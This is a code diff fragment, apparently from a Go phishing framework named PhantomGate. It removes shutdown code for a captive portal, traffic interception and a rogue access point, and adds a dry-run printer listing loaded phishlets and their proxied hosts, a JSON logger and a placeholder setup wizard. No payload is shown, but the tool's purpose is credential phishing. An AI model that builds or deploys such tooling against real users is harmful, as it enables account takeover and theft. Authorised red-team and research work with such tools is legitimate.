-	fmt.Println("\n  [!] Shutting down PhantomGate...")
-
-	// Stop captive portal
-	if captivePortalInstance != nil {
-		captivePortalInstance.Stop()
-	}
-
-	// Stop interception (restore network state)
-	if interceptSuite != nil {
-		interceptSuite.Stop()
-	}
-
-	// Stop rogue AP
-	if rogueAPInstance != nil {
-		rogueAPInstance.Stop()
-	}
-
-	fmt.Println("  [✓] All data saved. Goodbye.")
 }
 
+func printDryRun(cfg *config.Config, pm *phishlet.PhishletManager) {
+	dashboard.PrintSection("DRY-RUN: Configuration")
+	dashboard.PrintInfo("Domain:      %s", cfg.Domain)
+	dashboard.PrintInfo("Listen IP:   %s", cfg.ListenIP)
+	dashboard.PrintInfo("HTTPS Port:  %d", cfg.HTTPSPort)
+	dashboard.PrintInfo("HTTP Port:   %d", cfg.HTTPPort)
+	dashboard.PrintInfo("Admin Port:  %d", cfg.AdminPort)
+	dashboard.PrintInfo("TLS Mode:    %s", cfg.TLS.Mode)
+	fmt.Println()
+	dashboard.PrintSection("Loaded Phishlets")
+	for _, name := range pm.List() {
+		p, _ := pm.Get(name)
+		hosts := make([]string, 0)
+		for _, h := range p.ProxyHosts {
+			hosts = append(hosts, h.OrigSub)
+		}
+		fmt.Printf("    %-20s %s\n", name, strings.Join(hosts, ", "))
+	}
+	fmt.Println()
+	dashboard.PrintSuccess("Configuration is valid. Exiting without starting.")
+}
+
+type jsonWriter struct{}
+
+func (j *jsonWriter) Write(p []byte) (n int, err error) {
+	entry := map[string]string{
+		"level":   "info",
+		"message": strings.TrimSpace(string(p)),
+		"time":    time.Now().UTC().Format(time.RFC3339),
+	}
+	data, _ := json.Marshal(entry)
+	fmt.Println(string(data))
+	return len(p), nil
+}
+
+// Placeholder for wizard - will be replaced with full implementation
+func runWizard(cfg *config.Config) *config.Config {
+	dashboard.PrintSection("Interactive Wizard")
+	dashboard.PrintInfo("Wizard mode requires interactive input")
+	dashboard.PrintInfo("Use --domain, --phishlet, and --admin-pass flags instead")
+	return cfg
+}
